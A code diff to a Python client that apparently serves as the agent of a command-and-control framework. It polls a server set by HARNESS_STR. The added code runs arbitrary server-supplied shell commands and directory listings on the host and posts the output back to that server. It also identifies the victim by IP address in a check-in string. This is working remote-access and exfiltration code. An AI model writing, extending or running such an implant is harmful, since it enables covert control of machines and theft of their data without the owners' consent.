@@ -56,10 +56,11 @@ def go_sleep(client, args):
 
 
 def list_files(client, args):
+    output = run("ls -alh {}".format(args))
     requests.post("http://{}/response/{}".format(
         HARNESS_STR,
         client),
-        data={"data": "data.txt\nresponse.exe\n"}
+        data={"data": output}
     )
 
 
@@ -69,7 +70,10 @@ def handle_resp(resp, args, client):
 
 
 def call_terminal(client, args):
-    output = run(args)
+    try:
+        output = run(args)
+    except Exception as literally_anything:
+        output = str(literally_anything)
     requests.post("http://{}/response/{}".format(
         HARNESS_STR,
         client),
@@ -87,5 +91,14 @@ HANDLER = {
 
 
 if __name__ == "__main__":
-    client_info = "C_127.0.0.1_1"
+    from sys import argv
+    import socket
+    from random import randint
+    if len(argv) > 1:
+        HARNESS_STR = argv[1]
+    # client info is <drive serial>_<ip addr>_<is admin>
+    first_ip = socket.gethostbyname(socket.gethostname())
+    client_info = "{}_{}_0".format(randint(1, 9999), first_ip)
+    from sys import stdout
+    stdout.write("{}\n{}\n".format(client_info, HARNESS_STR))
     control_loop(client_info)
